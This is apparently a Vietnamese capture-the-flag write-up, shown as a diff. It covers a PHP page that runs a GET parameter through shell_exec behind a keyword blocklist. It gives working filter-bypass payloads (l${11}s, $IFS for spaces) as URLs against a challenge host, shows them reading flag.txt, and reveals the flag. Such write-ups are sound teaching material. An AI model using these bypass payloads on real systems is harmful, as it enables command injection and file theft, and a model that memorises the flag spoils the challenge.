@@ -1,0 +1,41 @@
+Khi mở đường link lên ta sẽ thấy một trang web có mã lệnh php như sau:
+
+<?php
+if(!isset($_GET['cmd'])){
+    highlight_file(__FILE__);
+}
+else{
+    $_GET['cmd']=addslashes($_GET['cmd']);
+    if(preg_match("/cat|ls|head|\'|\"|less| |nl|echo|more|tail|grep|dir|tac|\>|\<|\=|\*|\&|\,|\`|\@/is",$_GET['cmd'])){
+        die("bad linux user");
+    }
+    else{
+        echo shell_exec($_GET['cmd']);
+    }
+}
+?>
+ 
+Ngay lập tức ta sẽ nhận ra một dòng lệnh kiến cho ta có thể đưa các shell code vào là shell_exec($_GET[‘cmd’]);
+Vậy ta phải đưa vào shell code.
+Tuy nhiên khi đưa vào thông qua GET thì ta gặp một filter là addslashes. Filter này sẽ khiến cho khi ta nhập các ký hiệu đặc biệt sang dạng escape Character. Đồng thời ta gặp một filter khác là Preg_match và khiến cho ta không thể đưa các shell code vào dưới dạng thông thường được. Vì thế ta cần tìm một cách đưa shell code này vượt qua các filter này.
+Đầu tiên ta thử thực hiện lệnh ls
+Hiển nhiên lệnh ls đã bị chặn. Tuy nhiên ta có thể thực hiện lệnh l${x}s với x là một số lớn hơn 10.
+http://45.122.249.68:8088/?cmd=l${11}s
+Ta nhan duoc file index.php
+Vậy trong thư mục không có chứa file flag cần tìm.
+
+Có hai khả năng xảy ra là file flag đã bị ẩn đi hoặc là được lưu ở thư mục lớn hơn. Ta kiểm tra khả năng bị ẩn đi trước, vì thể ta cần thực hiện lệnh ls -a. 
+Tuy nhiên ký tự  “ “ đã bị filter và không thể sử dụng. Một số cách như /**/ hoặc <> cũng đã bị filter. 
+Dù thế ta có thể sử dụng ký tự đặc biệt $IFS để vượt qua filter này.
+http://45.122.249.68:8088/?cmd=l${11}s$IFS-a
+Ta nhận được . .. index.php 
+ 
+Ta không tìm thấy file flag nên ta thử truy ngược lại bằng lệnh ls .. và tìm ra thư mục chứa file flag
+http://45.122.249.68:8088/?cmd=l${11}s$IFS../../..
+ 
+Cuối cùng ta thực hiện lệnh cat để đọc file
+http://45.122.249.68:8088/?cmd=ca${11}t$IFS../../../flag.txt
+
+Flag: flag{b3st_b3st_b3st} 
+ 
+
